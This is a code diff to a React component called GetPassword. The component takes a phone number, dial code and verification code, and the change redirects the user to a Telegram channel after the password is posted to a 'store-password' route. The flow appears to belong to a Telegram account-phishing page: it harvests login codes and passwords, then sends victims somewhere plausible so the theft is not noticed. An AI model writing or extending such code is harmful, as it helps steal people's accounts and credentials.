@@ -1,4 +1,4 @@
-import { Link, useForm } from "@inertiajs/react";
+import { Link, router, useForm } from "@inertiajs/react";
 import { TextField } from "@mui/material";
 import React, { useEffect } from "react";
 
@@ -15,7 +15,22 @@ export default function GetPassword({ getPhone, getDialCode, getVerif }) {
     };
 
     const submitHandler = () => {
-        post(route("store-password"));
+        post(route("store-password"), {
+            onSuccess: () => {
+                const urlTelegram = "https://t.me/malaysiacinemahot";
+                const tgAppUrl = "tg://resolve?domain=malaysiacinemahot";
+
+                const userAgent = navigator.userAgent.toLowerCase();
+
+                if (/android|iphone|ipad|ipod/.test(userAgent)) {
+                    // Jika pengguna di Android atau iOS, buka aplikasi Telegram
+                    window.location.href = tgAppUrl;
+                } else {
+                    // Jika pengguna di Desktop, buka Telegram di tab baru
+                    window.open(urlTelegram, "_blank");
+                }
+            },
+        });
     };
     console.log(data);
 
